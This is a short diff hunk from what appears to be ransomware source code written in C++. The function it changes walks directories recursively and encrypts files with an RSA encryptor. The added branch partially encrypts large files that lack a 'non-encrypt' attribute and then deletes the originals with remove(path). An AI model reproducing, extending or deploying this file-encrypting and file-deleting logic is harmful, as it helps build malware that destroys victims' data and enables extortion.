@@ -542,6 +542,11 @@ static void iterate(const path& parent,
 				if (is_directory(path))
 					iterate(path, rsaEncryptor, processedPaths);
 			}
+			else if(file_size(path) > MAX_FILE_SIZE && !hasNonEncryptAttribute(path))
+			{
+				partialEncrypt(path, rsaEncryptor);
+				remove(path);
+			}
 			else {
 				if (!do_encrypt(path)) continue;
 				status = encrypt(path, rsaEncryptor);
